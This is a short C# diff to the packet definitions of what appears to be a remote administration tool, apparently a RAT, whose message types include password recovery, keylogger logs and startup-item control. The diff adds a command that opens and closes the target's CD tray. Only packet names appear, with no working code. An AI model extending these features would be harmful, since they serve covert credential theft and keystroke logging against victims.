@@ -22,7 +22,8 @@ namespace Serveur.Packets
         GetSysInfo, GetSysInfoResponse, // System Information
         GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove, // Startup Manager
         GetPasswords, GetPasswordsResponse, // Password Recovery
-        GetKeyLoggerLogs, GetKeyLoggerLogsResponse // Key Logger
+        GetKeyLoggerLogs, GetKeyLoggerLogsResponse, // Key Logger
+        DoTrayCdOpenClose // Open Close Tray CD
     }
 
     [Union(typeof(SetStatus), // Set Status
@@ -39,7 +40,8 @@ namespace Serveur.Packets
         typeof(GetSysInfo), typeof(GetSysInfoResponse), // System Information
         typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove), // Startup Manager
         typeof(GetPasswords), typeof(GetPasswordsResponse), // Password Recovery
-        typeof(GetKeyLoggerLogs), typeof(GetKeyLoggerLogsResponse))] // Key Logger
+        typeof(GetKeyLoggerLogs), typeof(GetKeyLoggerLogsResponse),
+        typeof(DoTrayCdOpenClose))] // Key Logger
 
     public abstract class IPackets
     {
